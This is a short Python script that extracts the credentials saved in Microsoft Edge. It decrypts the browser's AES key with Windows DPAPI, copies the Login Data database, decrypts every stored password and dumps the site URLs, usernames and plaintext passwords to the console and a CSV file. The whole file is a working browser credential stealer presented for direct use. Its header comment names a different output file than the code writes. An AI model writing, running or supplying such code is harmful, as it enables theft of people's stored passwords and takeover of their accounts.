#this script extracts usernames and passwords from Microsoft Edge 
#for each website that the user has locally stored
#his credentials. Saves output in chrome_creds.csv.

import os
import sys
from shutil import copy2
import sqlite3
from base64 import b64decode
from json import loads
import win32crypt
from Crypto.Cipher import AES
import csv

def edge_creds_extractor():
    #extract and decode the AES key which is used to
    #encrypt the passwords.
    #It is stored in '%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Local State'
    #as json format

    try:
        key_path = os.path.join(os.environ['USERPROFILE'],'AppData','Local','Microsoft','Edge','User Data','Local State')
        with open(key_path,'r',encoding='utf-8') as f:
            key = loads(f.read())
            key = b64decode(key['os_crypt']['encrypted_key'])
            #remove DPAPI string
            key = key[5:]
            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
    except Exception as e:
        print(e)
        sys.exit(1)

    #copy sqlite edge database since it cannot be accessed
    #while edge is running. It's location is
    #'%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\default\Login Data'
    
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Microsoft", "Edge", "User Data", "default", "Login Data")
        copy2(db_path,'edge_db_temp.db')

        conn = sqlite3.connect('edge_db_temp.db')
        c = conn.cursor()
        #query desired info from database
        c.execute('SELECT action_url, username_value, password_value FROM logins')



        action_urls = list()
        usernames = list()
        passwords = list()

        for row in c.fetchall():
            action_url = row[0]
            username = row[1]
            password = row[2]

            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            
            print(f"action_url: {action_url}\nusername: {username}")
            #decrypt password
            try:
                password = cipher.decrypt(password)[:-16].decode()
            except Exception as e:
                print(e)
            print(f'password: {password}\n')
            

            action_urls.append(action_url)
            usernames.append(username)
            passwords.append(password)


        #save result into csv file
        with open('edge_creds.csv',mode='w') as f:
            csv_writer = csv.writer(f,delimiter=',')
            csv_writer.writerow(["action_url","username","password"])
            for action_url,username,password in zip(action_urls,usernames,passwords):
                csv_writer.writerow([action_url,username,password])

            
    except Exception as e:
        print(e)
        sys.exit(1)

    finally:
        c.close()
        conn.close()
        os.remove('edge_db_temp.db')

edge_creds_extractor()
